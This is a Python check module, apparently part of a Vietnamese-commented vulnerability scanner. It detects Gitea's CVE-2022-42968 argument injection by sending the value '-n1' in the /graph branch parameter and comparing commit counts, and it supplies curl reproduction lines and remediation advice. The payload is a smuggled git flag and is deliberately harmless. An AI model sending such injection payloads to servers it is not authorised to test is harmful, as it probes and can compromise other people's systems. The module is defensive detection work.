"""CVE-2022-42968 — Argument Injection qua query param `branch` tại /graph.

Root cause (xem report/Report_VULN-02_CVE-2022-42968.md): Gitea < 1.17.3 chỉ
lọc giá trị branch bắt đầu bằng "--", bỏ sót giá trị 1 dấu gạch ("-"). Payload
đã verify: `?branch=-n1&branch=<default_branch>` khiến `git log` hiểu `-n1`
là flag giới hạn output (chỉ 1 commit) thay vì tên branch.

Analyze flow (KHÔNG cần auth — route dùng reqRepoCodeReader, áp dụng trên repo
public):
1. Baseline: GET /{owner}/{repo}/graph (không param) -> đếm số commit hiển thị.
2. Payload: GET /{owner}/{repo}/graph?branch=-n1&branch=<default_branch>.
3. Nếu baseline > 1 commit VÀ payload trả về ít hơn baseline -> VULNERABLE
   (bằng chứng: input đã được git hiểu như flag, không phải tên branch).
   Nếu số lượng bằng nhau -> NOT_VULNERABLE (filter đã chặn đúng).
   Nếu không đếm được / lỗi mạng -> INCONCLUSIVE.

Đây là 1 cặp request duy nhất (baseline + 1 payload) — không thử thêm biến thể
flag nào khác ngoài `-n1`, đúng với PoC đã verify trong report gốc.
"""
import re

import requests
from bs4 import BeautifulSoup

from checks.registry import CheckContext
from core.models import CheckResult, Status

CVE_ID = "CVE-2022-42968"
REF_ID = "VULN-02"
RISK_LEVEL = "High"
WSTG_REF = "WSTG-INPV (Argument Injection, CWE-88)"
CWE = "CWE-88 — Argument Injection or Modification"
REMEDIATION = (
    "Nâng cấp Gitea lên >= 1.17.3 (bản dùng AddDynamicArguments() để reject "
    "argument bắt đầu bằng dấu '-'). Nếu chưa upgrade được ngay, vá tạm bằng "
    "cách chặn mọi giá trị branch bắt đầu bằng '-' (không chỉ '--') trước khi "
    "đưa vào lệnh git."
)
REFERENCES = [
    "CVE-2022-42968",
    "GHSA-w8xw-7crf-h23x",
    "Gitea PR #21463 (fix)",
    "CWE-88: https://cwe.mitre.org/data/definitions/88.html",
]


def _count_commits(html: str, owner: str, repo: str) -> int:
    """Đếm số commit hiển thị trên trang /graph.

    Chiến lược chính: đếm số link <a href="/{owner}/{repo}/commit/{sha}"> duy
    nhất (mỗi commit trên graph luôn có ít nhất 1 link dạng này tới trang chi
    tiết commit). Fallback: đếm theo pattern JSON nhúng sẵn cho Vue nếu trang
    render phía client.
    """
    soup = BeautifulSoup(html, "html.parser")
    prefix = f"/{owner}/{repo}/commit/"
    hrefs = {a["href"] for a in soup.find_all("a", href=True) if a["href"].startswith(prefix)}
    if hrefs:
        return len(hrefs)

    # Fallback: một số bản Gitea nhúng data commit dưới dạng JSON cho Vue graph
    # component thay vì render <a> trực tiếp trong HTML tĩnh.
    matches = re.findall(r'"[Ss]ha1?"\s*:\s*"[0-9a-f]{7,40}"', html)
    return len(set(matches))


def analyze(ctx: CheckContext) -> CheckResult:
    owner = ctx.args.graph_owner
    repo = ctx.args.graph_repo

    def result(status: Status, evidence: str, detail: str, request_repro: str = "", response_summary: str = "") -> CheckResult:
        return CheckResult(
            cve_id=CVE_ID,
            ref_id=REF_ID,
            risk_level=RISK_LEVEL,
            wstg_ref=WSTG_REF,
            cwe=CWE,
            status=status,
            evidence=evidence,
            detail=detail,
            request_repro=request_repro,
            response_summary=response_summary,
            remediation=REMEDIATION,
            references=REFERENCES,
        )

    # Xác định default_branch để ghép cùng payload "-n1" (cần >=1 branch hợp lệ
    # đứng sau để git đủ tham số bắt buộc, tránh bị Gitea fallback bỏ qua toàn
    # bộ branches khi git báo lỗi cú pháp — xem report gốc mục "Test injection
    # đơn lẻ" vs "PoC thành công").
    try:
        api_resp = requests.get(
            f"{ctx.base_url}/api/v1/repos/{owner}/{repo}",
            timeout=ctx.timeout,
        )
        api_resp.raise_for_status()
        default_branch = api_resp.json().get("default_branch", "main")
    except (requests.exceptions.RequestException, ValueError) as exc:
        return result(
            Status.INCONCLUSIVE,
            evidence="",
            detail=f"Không lấy được default_branch của {owner}/{repo} qua API: {exc}",
        )

    baseline_url = f"{ctx.base_url}/{owner}/{repo}/graph"
    payload_url = f"{ctx.base_url}/{owner}/{repo}/graph?branch=-n1&branch={default_branch}"

    try:
        baseline_resp = requests.get(baseline_url, timeout=ctx.timeout)
        baseline_resp.raise_for_status()
    except requests.exceptions.RequestException as exc:
        return result(Status.INCONCLUSIVE, evidence="", detail=f"Lỗi khi gọi baseline GET {baseline_url}: {exc}")

    try:
        payload_resp = requests.get(payload_url, timeout=ctx.timeout)
        payload_resp.raise_for_status()
    except requests.exceptions.RequestException as exc:
        return result(Status.INCONCLUSIVE, evidence="", detail=f"Lỗi khi gọi payload GET {payload_url}: {exc}")

    baseline_count = _count_commits(baseline_resp.text, owner, repo)
    payload_count = _count_commits(payload_resp.text, owner, repo)

    evidence = (
        f"Baseline ({baseline_url}): {baseline_count} commit hiển thị\n"
        f"Payload ({payload_url}): {payload_count} commit hiển thị"
    )
    request_repro = (
        f"curl -i \"{baseline_url}\"\n"
        f"curl -i \"{payload_url}\""
    )
    response_summary = (
        f"Baseline: HTTP {baseline_resp.status_code}\n"
        f"Payload: HTTP {payload_resp.status_code}"
    )

    if baseline_count == 0:
        return result(
            Status.INCONCLUSIVE,
            evidence=evidence,
            detail=(
                "Không đếm được commit nào ở baseline — repo có thể trống, "
                "private, hoặc cấu trúc HTML của bản Gitea này khác với "
                "logic parse hiện tại (cần cập nhật _count_commits)."
            ),
            request_repro=request_repro,
            response_summary=response_summary,
        )

    if baseline_count > 1 and payload_count < baseline_count:
        detail = (
            f"Payload '?branch=-n1&branch={default_branch}' làm số commit hiển thị "
            f"giảm từ {baseline_count} xuống {payload_count}. Đây là bằng chứng "
            "'-n1' đã được git hiểu như flag giới hạn output (argument injection), "
            "không phải như tên branch (nếu là tên branch không tồn tại, Gitea sẽ "
            "báo lỗi hoặc bỏ qua, không làm thay đổi số lượng theo kiểu giới hạn này)."
        )
        return result(Status.VULNERABLE, evidence=evidence, detail=detail, request_repro=request_repro, response_summary=response_summary)

    detail = (
        f"Số commit hiển thị không đổi giữa baseline ({baseline_count}) và payload "
        f"({payload_count}) — filter branch có vẻ đã chặn đúng giá trị bắt đầu bằng '-'."
    )
    return result(Status.NOT_VULNERABLE, evidence=evidence, detail=detail, request_repro=request_repro, response_summary=response_summary)
